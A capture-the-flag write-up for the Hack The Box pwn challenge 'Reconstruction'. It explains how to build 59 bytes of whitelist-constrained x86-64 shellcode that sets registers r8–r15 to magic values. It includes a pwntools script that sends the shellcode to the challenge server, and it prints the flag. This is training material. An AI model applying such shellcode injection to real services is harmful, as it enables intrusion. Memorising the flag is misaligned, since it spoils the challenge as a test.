---
title: "Reconstruction"
ctf: "HTB"
date: 2026-06-11
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# Reconstruction

## Summary

The binary accepts up to 60 bytes of shellcode, but only bytes from an allowed set. The shellcode must set registers r8-r15 to specific magic values and `ret`. Craft a 59-byte payload using only allowed bytes that sets each register via `MOV r/m64, imm32` (0xC7 /0 for values with bit31=0) or `MOV r64, imm64` (0x49 0xB8+reg for values with bit31=1), then `ret`.

## Solution

### Step 1: Analyze allowed bytes and register targets

The binary reads 0x3c (60) bytes of shellcode, validates each byte is in `{0x49, 0xc7, 0xb9, 0xc0, 0xde, 0x37, 0x13, 0xc4, 0xc6, 0xef, 0xbe, 0xad, 0xca, 0xfe, 0xc3, 0x00, 0xba, 0xbd}`, copies it to an executable region, and calls it. After execution, it checks:
- `r8` = `0x1337c0de`, `r9` = `0xdeadbeef`, `r10` = `0xdead1337`
- `r12` = `0x1337cafe`, `r13` = `0xbeefc0de`, `r14` = `0x13371337`, `r15` = `0x1337dead`

### Step 2: Craft register-setting shellcode

The only REX prefix available is `0x49` (REX.WB), which sets 64-bit operand size and extends the r/m field to `r8-r15`. Two instruction forms fit the allowed byte set:

- **`MOV r/m64, imm32`** (`0xC7 /0`): 7 bytes, sign-extends 32-bit immediate. Works when bit31=0 (values like `0x1337c0de`).
- **`MOV r64, imm64`** (`0x49 0xB8+reg ...`): 10 bytes, needed when bit31=1 (`0xdeadbeef`, `0xdead1337`, `0xbeefc0de`).

The 59-byte shellcode sets all 7 registers and returns:

```python
from pwn import *

context.arch = 'amd64'
io = remote('154.57.164.81', 32018)

sc = bytes([
    # r8 = 0x1337c0de  (bit31=0 → C7 /0 form)
    0x49, 0xc7, 0xc0, 0xde, 0xc0, 0x37, 0x13,
    # r9 = 0xdeadbeef   (bit31=1 → imm64 form)
    0x49, 0xb9, 0xef, 0xbe, 0xad, 0xde, 0x00, 0x00, 0x00, 0x00,
    # r10 = 0xdead1337  (bit31=1)
    0x49, 0xba, 0x37, 0x13, 0xad, 0xde, 0x00, 0x00, 0x00, 0x00,
    # r12 = 0x1337cafe  (bit31=0)
    0x49, 0xc7, 0xc4, 0xfe, 0xca, 0x37, 0x13,
    # r13 = 0xbeefc0de  (bit31=1)
    0x49, 0xbd, 0xde, 0xc0, 0xef, 0xbe, 0x00, 0x00, 0x00, 0x00,
    # r14 = 0x13371337  (bit31=0)
    0x49, 0xc7, 0xc6, 0x37, 0x13, 0x37, 0x13,
    # r15 = 0x1337dead  (bit31=0)
    0x49, 0xc7, 0xc7, 0xad, 0xde, 0x37, 0x13,
    # ret
    0xc3,
])

io.recvuntil(b'fix')
io.sendline(b'fix')
io.recvuntil(b'components:')
io.send(sc)
flag = io.recvall(timeout=5)
print(flag.decode().strip())
```

## Flag

```
HTB{b4by_asm_2_th3_r3g_2_th3_r1ght}
```
